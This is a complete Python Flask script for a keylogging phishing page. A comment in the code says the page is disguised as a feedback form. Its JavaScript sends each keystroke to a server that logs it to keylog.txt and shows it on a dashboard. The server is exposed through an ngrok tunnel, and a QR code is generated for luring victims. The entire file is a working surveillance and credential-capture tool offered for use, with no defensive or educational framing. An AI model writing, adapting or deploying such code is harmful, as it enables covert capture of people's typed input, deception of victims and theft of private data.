#!/usr/bin/env python3
import json
import os
from flask import Flask, request, render_template_string
from datetime import datetime
from pyngrok import ngrok, conf
import qrcode
import getpass
from termcolor import colored

# Initialize Flask app
app = Flask(__name__)
log = []

# HTML template for main page (disguised as a feedback form)
MAIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Feedback Form</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        textarea { width: 100%; height: 100px; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <h1>Share Your Feedback</h1>
    <p>Type your thoughts or notes below:</p>
    <textarea id="input" placeholder="Enter your feedback..."></textarea>
    <p>Thank you for your input!</p>
    <script>
        document.getElementById('input').addEventListener('keydown', function(e) {
            fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    key: e.key,
                    code: e.code,
                    type: e.key.length === 1 ? 'printable' : 'control',
                    time: new Date().toISOString()
                })
            }).catch(err => console.error('Error:', err));
        });
    </script>
</body>
</html>
"""

# HTML template for dashboard
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Input Log Viewer</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        pre { background: #f4f4f4; padding: 10px; }
    </style>
</head>
<body>
    <h1>Input Logs</h1>
    <p>Showing last 50 entries:</p>
    <pre>{{ logs }}</pre>
</body>
</html>
"""

# Load or prompt for configuration
CONFIG_FILE = "config.json"
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    config = {}
    config['ngrok_api_key'] = getpass.getpass(colored("Enter ngrok API key: ", "yellow"))
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    return config

# Generate QR code for public URL
def generate_qr_code(url):
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save("qrcode.png")
    print(colored(f"QR code saved: qrcode.png ({url})", "green"))

# Routes
@app.route("/")
def index():
    return render_template_string(MAIN_TEMPLATE)

@app.route("/log", methods=["POST"])
def receive_key():
    data = request.json
    key = data.get("key")
    code = data.get("code")
    key_type = data.get("type")
    timestamp = data.get("time")
    
    # Format timestamp for brevity
    short_time = datetime.fromisoformat(timestamp.rstrip('Z')).strftime("%H:%M:%S")
    log_entry = f"[{short_time}] {key_type.capitalize()}: {key} ({code})"
    print(colored(log_entry, "cyan"))
    log.append(log_entry)
    with open("keylog.txt", "a") as f:
        f.write(log_entry + "\n")
    return '', 204

@app.route("/view-logs")
def show_logs():
    logs = "\n".join(log[-50:])  # Show last 50 logs
    return render_template_string(DASHBOARD_TEMPLATE, logs=logs)

def main():
    # Load configuration
    config = load_config()
    print(colored("Config loaded", "green"))
    
    # Set up ngrok
    try:
        conf.get_default().api_key = config['ngrok_api_key']
        tunnel = ngrok.connect(8080, proto="http", bind_tls=True)
        print(colored(f"Tunnel started: {tunnel.public_url}", "green"))
        generate_qr_code(tunnel.public_url)
    except Exception as e:
        print(colored(f"Ngrok error: {e}", "red"))
        return

    # Start Flask server
    print(colored("Starting server: http://0.0.0.0:8080", "green"))
    app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("Shutting down", "yellow"))
        ngrok.disconnect()
        ngrok.kill()